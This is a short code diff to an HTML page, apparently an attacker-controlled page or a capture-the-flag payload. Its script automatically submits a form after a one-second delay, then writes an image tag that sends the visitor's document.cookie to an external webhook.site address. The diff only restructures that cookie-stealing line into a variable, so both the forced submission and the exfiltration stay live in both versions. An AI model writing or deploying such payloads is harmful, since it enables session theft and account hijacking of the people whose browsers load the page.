@@ -13,7 +13,8 @@
       // Add a small delay to ensure the form elements are ready
       setTimeout(function() {
         document.forms[0].submit(); // Automatically submit the form
-        document.write('<img src="https://webhook.site/c372b661-1e92-40ed-9a01-f5a4fd487436?test='+document.cookie+'" />'); // Triggered after form submission
+        var url = "https://webhook.site/c372b661-1e92-40ed-9a01-f5a4fd487436?test=" + document.cookie;
+        document.write('<img src="' + url + '" />'); // Triggered after form submission
       }, 1000); // Adjust the delay as needed
     </script>
     <h2>submitted</h2>
